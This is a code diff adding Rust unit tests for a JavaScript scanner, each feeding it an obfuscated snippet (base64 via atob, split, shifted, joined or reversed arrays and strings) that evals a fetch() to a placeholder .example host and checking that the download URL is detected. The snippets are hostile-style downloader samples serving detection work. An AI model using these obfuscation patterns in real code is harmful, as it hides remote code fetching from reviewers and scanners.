@@ -39785,6 +39785,172 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_array_index_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-array-index-js.example/p')",
+        );
+        let js = format!(r#"var a = ["{encoded}"]; eval(atob(a[0]))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-array-index-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob array index payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_assigned_array_index_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-assigned-array-index-js.example/p')",
+        );
+        let js = format!(r#"var a = ["{encoded}"]; var b = a[0]; eval(atob(b))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-assigned-array-index-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob assigned array index payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_array_shift_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-array-shift-js.example/p')",
+        );
+        let js = format!(r#"var a = ["{encoded}", "noise"]; eval(atob(a.shift()))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-array-shift-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob array shift payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_assigned_array_shift_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-assigned-array-shift-js.example/p')",
+        );
+        let js = format!(r#"var a = ["{encoded}", "noise"]; var b = a.shift(); eval(atob(b))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-assigned-array-shift-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob assigned array shift payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_array_join_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-array-join-js.example/p')",
+        );
+        let split = encoded.len() / 2;
+        let (left, right) = encoded.split_at(split);
+        let js = format!(r#"var a = ["{left}", "{right}"]; eval(atob(a.join("")))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-array-join-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob array join payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_array_slice_join_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-array-slice-join-js.example/p')",
+        );
+        let split = encoded.len() / 2;
+        let (left, right) = encoded.split_at(split);
+        let js =
+            format!(r#"var a = ["noise", "{left}", "{right}"]; eval(atob(a.slice(1).join("")))"#)
+                .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-array-slice-join-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob array slice/join payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_array_reverse_slice_join_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-array-reverse-slice-join-js.example/p')",
+        );
+        let split = encoded.len() / 2;
+        let (left, right) = encoded.split_at(split);
+        let js = format!(
+            r#"var a = ["noise", "{right}", "{left}"]; eval(atob(a.reverse().slice(0, 2).join("")))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-array-reverse-slice-join-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob array reverse/slice/join payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_apply_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
@@ -40067,6 +40233,26 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS Array.from([...]) join URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_array_from_string_reverse_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = Array.from("egats/elpmaxe.morf-yarra-sj//:sptth").reverse().join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-from.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "JS Array.from(string) reverse/join URL missed: {:?}",
             env.traits
         );
     }
